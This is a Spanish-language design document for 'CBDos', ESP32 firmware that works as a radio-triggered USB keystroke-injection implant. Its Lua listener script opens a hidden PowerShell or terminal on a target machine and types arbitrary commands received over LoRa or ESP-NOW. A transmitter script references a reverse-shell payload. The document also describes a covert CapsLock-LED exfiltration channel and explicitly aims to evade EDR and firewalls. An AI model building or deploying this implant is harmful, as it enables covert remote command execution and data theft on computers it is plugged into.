# Arquitectura de Disparadores Tácticos Fuera de Banda (OOB Trigger & Remote C2)
**Ecosistema:** CBDos (ESP32-P4 / ESP32-S3 / Coprocesadores de Radio)  
**Módulos:** Lua Engine + HID / DuckyScript Subsystem + Radio HAL Abstraction Layer  
**Estado:** Especificación y Documentación de Arquitectura

---

## 1. Visión General del Vector Fuera de Banda (Out-of-Band C2)

En operaciones de automatización, administración remota o auditoría de seguridad física, los vectores tradicionales basados en red IP (SSH, RDP, WebSockets) presentan serias limitaciones:
- Dependen de la conectividad a Internet o de la red local (LAN/VLAN) del objetivo.
- Son detectables por software EDR, firewalls corporativos e inspección de paquetes en el host.
- Requieren credenciales de red previas (SSID / WPA2 / 802.1X).

CBDos resuelve este problema implementando un modelo **Out-of-Band (OOB) Air-Gapped Trigger**:
1. **Host Target (PC/Servidor):** Conectado físicamente por puerto USB a una unidad CBDos (o dongle satélite gestionado por CBDos), enumerada como un dispositivo de entrada estándar y legítimo (**Human Interface Device - USB HID Composite: Teclado + Ratón + Consola Raw**).
2. **Canal de Radio Físico:** El CBDos o su módem transceptor recibe tramas de radio en capas físicas no IP o propietarias independientes del sistema operativo de la máquina víctima.
3. **Motor de Inyección (Lua Event-Driven):** Un script Lua corriendo en CBDos escucha eventos del bus de radio (`radio.onReceive` o sondeo de colas) y desencadena secuencias de pulsaciones de teclas, macros complejas, scripts DuckyScript (`.dd`) o escenas de automatización completas en la máquina local.

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    TRANSMISOR / C2 REMOTO (Cyberdeck / C3 / LoRa)       │
│               [UI Táctil CBDos] ──► [Radio TX / Módem RF]               │
└────────────────────────────────────┬────────────────────────────────────┘
                                     │
                 Ondas de Radio Fuera de Banda (OOB)
        (ESP-NOW Long Range, LoRa 433/868/915MHz, FLRC 2.4GHz,
         Wi-Fi HaLow 802.11ah, Zigbee/802.15.4, BLE Mesh)
                                     │
                                     ▼
┌─────────────────────────────────────────────────────────────────────────┐
│              RECEPTOR / IMPLANT TÁCTICO (CBDos P4 / S3)                 │
│                                                                         │
│   ┌──────────────────────┐          ┌───────────────────────────────┐   │
│   │   Radio HAL Driver   │ ───────► │       cbdos.radio (Lua)       │   │
│   │ (C3 / C6 / SX1262 /  │ Frames   │  Listener / Packet Filtering  │   │
│   │  SX1280 / CC1101)    │          └───────────────┬───────────────┘   │
│   └──────────────────────┘                          │                   │
│                                                     ▼                   │
│   ┌──────────────────────┐          ┌───────────────────────────────┐   │
│   │    USB Native OTG    │ ◄─────── │        cbdos.hid / ducky      │   │
│   │  (HID Keyboard/Mouse)│ Inyección│   Keystroke & Payload Engine  │   │
│   └──────────┬───────────┘          └───────────────────────────────┘   │
└──────────────┼──────────────────────────────────────────────────────────┘
               │ Conexión USB Física (0 drivers requeridos, 100% Plug & Play)
               ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                   MÁQUINA DESTINO / PC (Windows / Linux / macOS)        │
│       Ejecución instantánea de comandos / Bloqueo / Inyección de C2     │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 2. Tecnologías de Radio y Capas Físicas Soportadas

Gracias al diseño agnóstico del HAL de radio (`core/include/cbdos/radio.hpp` y módems seriales/SPI/USB), el sistema soporta diversas tecnologías según el alcance y entorno:

| Protocolo / PHY | Banda de Frecuencia | Rango Típico | Características Principales |
| :--- | :--- | :--- | :--- |
| **ESP-NOW (Standard / LR)** | 2.4 GHz (802.11 DSSS/OFDM) | 100 m – 1 km | Sin asociación Wi-Fi, latencia ultra baja (< 5 ms), modo Long Range (1/4 rate). |
| **LoRa (SX1262 / SX1276)** | 433 / 868 / 915 MHz (Sub-GHz) | 2 km – 15 km | Penetración extrema en hormigón/edificios, resistencia a interferencias. |
| **FLRC (Fast Long Range - SX1280)** | 2.4 GHz | 500 m – 3 km | Alta tasa de datos (hasta 1.3 Mbps) con sensibilidad superior a FSK/BLE. |
| **Wi-Fi HaLow (802.11ah)** | 850 – 950 MHz (Sub-GHz) | 1 km – 3 km | Conexión IP de largo alcance con bajo consumo y alta penetración. |
| **Zigbee / IEEE 802.15.4** | 2.4 GHz / Sub-GHz | 50 m – 300 m | Ruteo en malla natural, bajo consumo, compatibilidad con sensores. |

---

## 3. Arquitectura del Scripting Lua para Disparo de Escenas

El runtime Lua de CBDos expone interfaces no bloqueantes para enlazar eventos de radio con acciones de hardware.

### 3.1. Ejemplo: Servidor Receptor / Implant OOB (`oob_implant_listener.lua`)

```lua
-- ============================================================================
-- CBDos - Tactical Out-of-Band Radio Trigger & HID Controller
-- ============================================================================

local SECRET_KEY = "CBDOS_TACTICAL_AUTH_KEY_2026"
local TARGET_OS = "WINDOWS" -- "WINDOWS", "LINUX", "MACOS"

print("[OOB-HID] Inicializando motor táctico de escucha de radio...")
hid.setDelay(8) -- Delay estándar entre pulsaciones USB (ms)

-- Función auxiliar para abrir consola de comandos en el host
local function openTerminal()
    if TARGET_OS == "WINDOWS" then
        hid.combo(hid.MOD_GUI, hid.KEY_R)
        sys.delay(350)
        hid.printLn("powershell.exe -WindowStyle Hidden")
        sys.delay(500)
    elseif TARGET_OS == "LINUX" then
        hid.combo(hid.MOD_CONTROL + hid.MOD_ALT, hid.KEY_T)
        sys.delay(500)
    elseif TARGET_OS == "MACOS" then
        hid.combo(hid.MOD_GUI, hid.KEY_SPACE)
        sys.delay(300)
        hid.printLn("Terminal")
        sys.delay(500)
    end
end

-- Callback invocado por la tarea en segundo plano de Radio HAL
radio.onReceive(function(senderId, rawPayload, rssi)
    print(string.format("[RF RX] Emisor: %s | RSSI: %d dBm | Bytes: %d", senderId, rssi, #rawPayload))

    -- Validación y parseo de tramas (ej. "CMD:<AUTH_KEY>:<ACTION>:<PARAM>")
    local parts = {}
    for part in string.gmatch(rawPayload, "([^:]+)") do
        table.insert(parts, part)
    end

    if #parts < 3 or parts[2] ~= SECRET_KEY then
        print("[!] Trama rechazada: Clave no válida o formato incorrecto")
        return
    end

    local action = parts[3]
    local param = parts[4] or ""

    print("[*] Ejecutando acción OOB: " .. action)

    if action == "LOCK" then
        -- Bloquear pantalla de inmediato
        if TARGET_OS == "WINDOWS" then
            hid.combo(hid.MOD_GUI, hid.KEY_L)
        elseif TARGET_OS == "LINUX" then
            hid.combo(hid.MOD_CONTROL + hid.MOD_ALT, hid.KEY_L)
        elseif TARGET_OS == "MACOS" then
            hid.combo(hid.MOD_CONTROL + hid.MOD_GUI, hid.KEY_Q)
        end

    elseif action == "DUCKY_FILE" then
        -- Ejecutar un script DuckyScript prealmacenado en la MicroSD
        local path = "/sdcard/payloads/" .. param
        print("[*] Ejecutando DuckyScript: " .. path)
        ducky.runFile(path)

    elseif action == "TYPE_RAW" then
        -- Inyección de texto arbitrario recibido por radio
        hid.printLn(param)

    elseif action == "RUN_SHELL_CMD" then
        -- Inyectar comando en terminal silenciosa
        openTerminal()
        hid.printLn(param .. "; exit")

    elseif action == "STREAMDECK_SCENE" then
        -- Disparar atajos de escenas (ej. OBS, cambio de escritorio, macros)
        if param == "SCENE_ALERT" then
            hid.combo(hid.MOD_CONTROL + hid.MOD_SHIFT, hid.KEY_F1)
        elseif param == "SCENE_MUTE_ALL" then
            hid.combo(hid.MOD_CONTROL + hid.MOD_SHIFT, hid.KEY_F2)
        end

    elseif action == "TELEMETRY_REQ" then
        -- Responder al transmisor con el estado de las luces LED del teclado (CapsLock/NumLock)
        local leds = hid.getLedState()
        local reply = string.format("STATUS:NUMLOCK=%d:CAPSLOCK=%d:SCROLLLOCK=%d",
                                    leds.numLock and 1 or 0,
                                    leds.capsLock and 1 or 0,
                                    leds.scrollLock and 1 or 0)
        radio.send(senderId, reply)
    end
end)

print("[OOB-HID] Sistema en escucha activa.")
```

---

### 3.2. Ejemplo: Transmisor Remoto / Cyberdeck Controller (`oob_remote_tx.lua`)

```lua
-- Disparador desde una unidad portátil CBDos con pantalla táctil
local TARGET_NODE = "CBDOS_IMPLANT_01"
local SECRET_KEY = "CBDOS_TACTICAL_AUTH_KEY_2026"

function sendOOBCommand(action, param)
    local msg = string.format("CMD:%s:%s:%s", SECRET_KEY, action, param or "")
    local ok = radio.send(TARGET_NODE, msg)
    if ok then
        print("[TX OK] Comando enviado: " .. action)
    else
        print("[TX ERROR] Fallo al transmitir comando")
    end
end

-- Ejemplos de disparo
sendOOBCommand("LOCK")
-- sendOOBCommand("DUCKY_FILE", "payload_reverse_shell.dd")
-- sendOOBCommand("RUN_SHELL_CMD", "notepad.exe")
```

---

## 4. Telemetría Bidireccional (USB Host Feedback a través de Radio)

Una ventaja crítica del ESP32-P4/S3 es que el descriptor USB HID es bidireccional. La PC huésped envía de vuelta al dispositivo el estado de las luces de estado:
- **`NumLock`**
- **`CapsLock`**
- **`ScrollLock`**

Esto permite al script Lua confirmar el estado de la PC sin tener ningún agente de software instalado en la máquina:
1. **Detección de Sistema Bloqueado vs Desbloqueado:** Si al inyectar un toque de `CapsLock` la PC responde cambiando el flag de LED, el script sabe que el sistema operativo está despierto y respondiendo.
2. **Canal Exfiltrado Silencioso:** Un script ejecutado en la PC puede alternar `CapsLock` a diferentes frecuencias para transmitir bytes de telemetría de vuelta al CBDos a través del canal USB, y CBDos lo retransmite por LoRa/ESP-NOW al operador remoto.

---

## 5. Matriz de Seguridad y Mitigaciones

1. **Cifrado en la Capa de Radio:**
   - Todas las tramas OOB deben usar cifrado simétrico por hardware (**AES-128-CCM** en ESP-NOW o **AES-256-GCM** en el payload) con vector de inicialización (IV) incremental para prevenir ataques de repetición (*Replay Attacks*).
2. **Filtro de IDs y Whitelist:**
   - La API `cbdos.radio` permite configurar listas blancas de direcciones MAC / NodeIDs para descartar tramas no autorizadas a nivel de interrupción antes de llegar a la máquina virtual Lua.
3. **Interruptor de Emergencia (Hardware Kill-Switch):**
   - Soporte para deshabilitar la inyección HID físicamente mediante GPIO o combinación de botones táctiles en la pantalla de CBDos.
